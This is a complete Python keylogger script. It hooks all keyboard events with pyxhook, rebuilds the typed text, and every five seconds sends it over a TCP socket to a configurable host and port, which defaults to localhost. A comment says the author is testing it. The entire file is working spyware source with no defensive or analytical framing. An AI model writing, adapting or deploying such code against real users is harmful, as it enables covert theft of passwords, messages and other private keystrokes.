
def keylog(HOST = "127.0.0.1", PORT = 5004):

    import pyxhook
    import socket
    import time

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.setblocking(0)  # Set to non-blocking I am testing the keylogger

    buffer = ""

    def OnKeyboardEvent(event):
        nonlocal buffer  # Access the global buffer variable

        if event.Key == 'space':
            buffer += ' '  # Use += for string concatenation
        elif event.Key == 'Return':
            buffer += '\n'
        elif event.Key == "BackSpace":
            buffer = buffer[:-1] #removes last character
        else:
            buffer += event.Key

        print(buffer)
        return True
    
    # Create a new HookManager instance testing
    hm = pyxhook.HookManager()

    # Set the hook for key down events
    hm.KeyDown = OnKeyboardEvent

    # Start hooking the keyboard
    hm.HookKeyboard()

    # Start the hook manager's monitoring loop in a separate thread. Thus
    hm.start()

    while True:
        time.sleep(5)
        if(buffer != ''):
            print("sending buffer")
            s.send(buffer.encode('utf-8'))
            buffer = ''

if __name__ == "__main__":
    keylog()
            
        
    




